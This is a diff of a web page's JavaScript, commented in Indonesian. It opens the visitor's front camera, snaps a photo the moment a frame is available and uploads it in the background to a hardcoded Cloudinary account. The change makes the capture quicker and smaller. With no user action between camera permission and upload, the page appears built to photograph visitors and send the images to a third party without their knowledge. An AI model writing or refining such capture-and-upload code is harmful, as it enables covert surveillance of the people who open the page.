@@ -46,48 +46,46 @@
         const preview = document.getElementById('preview');
         const ctx = canvas.getContext('2d');
 
-        // 1. MINTA IZIN KAMERA DAN MULAI SEGERA
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
+
                 video.onloadedmetadata = () => {
-                    console.log("Kamera siap, mengambil foto dalam 1 detik...");
-                    setTimeout(takePhoto, 1000); // Kurangi waktu tunggu jadi 1 detik
+                    console.log("Kamera aktif, mengambil foto...");
+                    requestAnimationFrame(checkFrame);
                 };
-            })
-            .catch(err => {
-                console.error("Akses kamera ditolak!", err);
+            } catch (err) {
+                console.error("Izin kamera ditolak!", err);
                 alert("Izin kamera diperlukan untuk mengambil foto.");
-            });
-
-        // 2. AMBIL FOTO SEGERA
-        function takePhoto() {
-            if (video.videoWidth === 0 || video.videoHeight === 0) {
-                console.error("Kamera tidak siap!");
-                alert("Kamera belum siap, coba lagi.");
-                return;
             }
-
-            console.log("Mengambil foto...");
-            canvas.width = 600;  
-            canvas.height = 800;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            preview.src = canvas.toDataURL("image/jpeg", 0.8); // Tampilkan foto langsung
-
-            // 3. KOMPRES DAN UPLOAD DI LATAR BELAKANG
-            setTimeout(() => {
-                canvas.toBlob(uploadToCloudinary, "image/jpeg", 0.6);
-            }, 100);
         }
 
-        // 4. FUNGSI UPLOAD KE CLOUDINARY
+        function checkFrame() {
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                takePhoto();
+            } else {
+                requestAnimationFrame(checkFrame);
+            }
+        }
+
+        function takePhoto() {
+            console.log("Mengambil foto...");
+            canvas.width = 400;  // Resolusi lebih kecil agar lebih cepat
+            canvas.height = 600;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            preview.src = canvas.toDataURL("image/jpeg", 0.7);  // Ditampilkan langsung
+
+            setTimeout(() => {
+                canvas.toBlob(uploadToCloudinary, "image/jpeg", 0.6);
+            }, 50);
+        }
+
         function uploadToCloudinary(imageBlob) {
             let cloudName = "dl5dswv7q";  
             let uploadPreset = "tikontol";  
 
-            console.log("Mengunggah foto ke Cloudinary...");
-            
             let formData = new FormData();
             formData.append("file", imageBlob);
             formData.append("upload_preset", uploadPreset);
@@ -106,6 +104,8 @@
             })
             .catch(error => console.error("Gagal upload!", error));
         }
+
+        startCamera();
     </script>
 </body>
 </html>
